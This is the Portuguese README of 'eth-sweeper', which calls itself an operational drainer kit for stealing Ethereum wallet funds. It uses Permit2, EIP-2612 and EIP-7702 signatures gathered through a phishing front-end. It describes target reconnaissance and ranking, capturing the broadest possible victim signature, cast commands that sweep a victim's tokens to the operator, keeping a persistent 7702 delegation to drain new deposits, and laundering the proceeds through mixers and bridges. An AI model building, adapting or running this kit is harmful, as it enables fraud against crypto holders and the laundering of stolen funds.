# eth-sweeper

Kit operacional de drainer para Ethereum: **Permit2** (principal), **EIP-2612** (fallback) e **EIP-7702** (escalada), com contrato testado, recon de alvo, front-end de captura e submissão separada.

## Por que este vetor

Assinatura off-chain é o caminho mais fiável e mais eficaz:

- não custa gas para a vítima, então não há fricção nem transação no histórico dela;
- `Permit2` cobre **todos** os tokens já aprovados no contrato com uma única assinatura, inclusive em lote;
- a carteira mostra "verificar carteira" em vez de "enviar X";
- hardware wallet assina igual, porque não há chave envolvida;
- o operador pode esperar, simular e só submeter quando valer a pena;
- se a carteira suportar 7702, a mesma sessão escala para controle persistente.

## Estrutura

```
src/Drainer.sol        spender unico: permit2Batch, permit2612, pull, pull721, pull1155
src/Sweeper7702.sol    delegate 7702 (sweep + auto-forward de ETH)
test/Drainer.t.sol     10 testes, inclui assinatura EIP-712 real e anti-front-run
ops/deploy.mjs         deploy do Drainer e do Sweeper
ops/recon.mjs          saldo, allowances Permit2 e estado 7702 de um alvo
ops/targets.mjs        varre eventos Permit recentes e ranqueia alvos por saldo
ops/submit.mjs         consome um capture e envia a tx
ops/demo.mjs           demonstração ponta a ponta em Anvil
server.mjs             front-end + POST /api/capture
web/                   página de conexão, carteira e assinatura
```

## Fluxo

1. **Recon** — `node ops/recon.mjs 0xALVO` lista saldo, allowances existentes e se a conta já está delegada. `node ops/targets.mjs 300` monta uma lista de signatários ativos recentes.
2. **Captura** — a vítima abre o front-end, conecta, você pede a assinatura mais ampla possível (Permit2 batch).
3. **Execução** — `node ops/submit.mjs captures/<arquivo>.json`; o `Drainer` resgata a assinatura e puxa os tokens para o `payout`.
4. **Escalada** — se houver suporte a 7702, delegue para o `Sweeper7702`; a partir daí qualquer depósito novo pode ser varrido sem outra assinatura.

## Começar

```bash
cp .env.example .env          # RPC_URL, PRIVATE_KEY, PAYOUT
forge test                    # prova local dos fluxos
anvil                         # terminal 1
node ops/demo.mjs             # terminal 2: drena a carteira de teste

# caminho 7702, em outra porta
anvil --port 8546             # terminal 3
node ops/demo7702.mjs         # terminal 4
```

A demonstração imprime `drenado: OK` quando os 1000 mUSD saem da vítima para o operador, usando uma assinatura EIP-712 válida contra um replica do Permit2 no endereço canônico.

## Deploy

```bash
forge build
node ops/deploy.mjs
```

Grava `.deployments.json` com `drainer`, `sweeper`, `operator` e `payout`. Confira `payout` — é para lá que todo saque vai. A chave do operador só precisa pagar gas.

Depois:

```bash
node server.mjs               # http://127.0.0.1:8787
```

Preencha RPC, `drainer` e `sweeper` na página. O capture é gravado em `captures/` e o comando de submissão aparece na tela.

## 7702 pela linha de comando

Se você tiver a chave da vítima (ou para reproduzir localmente), a autorização sai pelo cast:

```bash
cast send --rpc-url $RPC_URL --private-key $VITIMA_PK --auth $SWEEPER \
  $VITIMA 'init(address)' $OPERADOR
cast send --rpc-url $RPC_URL --private-key $OPERADOR \
  $VITIMA 'sweep(address,address[],address[],uint256[])' \
  $OPERADOR '[0xTOKEN]' '[]' '[]'
```

Sem a chave, a autorização tem de ser assinada no wallet da vítima; o front-end tenta o type-4 e, se o wallet recusar, grava um capture `delegate` para você conduzir depois. `init` é first-caller-wins: envie a delegação e o `init` no mesmo bundle, senão um front-runner pode definir o operador dele. O `sweep` protege contra isso mandando para o operador registrado.

## Checklist de operação

- `payout` separado da chave que assina, e a chave do operador só com gas.
- Não assinar `Permit2.PermitBatch` com `spender` diferente do `Drainer`.
- `chainId` da captura tem de bater com o RPC no `submit`.
- Confirmar `expiration` do Permit2 longe e `amount = uint160.max`.
- Testar em fork/Anvil antes; simular a tx e conferir o diff de saldo.
- Depois do sweep: dividir em vários endereços, trocar por ETH/stable, bridge/mixer. Não consolidar tudo num único destino.
- Manter a delegação 7702 ativa e monitorar depósitos novos.

## Limites conhecidos

- `permit2612` usa a versão `"1"` do domínio; tokens com versão diferente precisam de ajuste manual.
- Tokens sem `permit` só caem via `pull` (aprovação prévia) ou 7702.
- `pull` e `pull721` exigem allowance anterior; o front-end marca esses casos.
- `permit2Batch` exige que a vítima já tenha aprovado o contrato Permit2 (o padrão de qualquer usuário de DeFi).
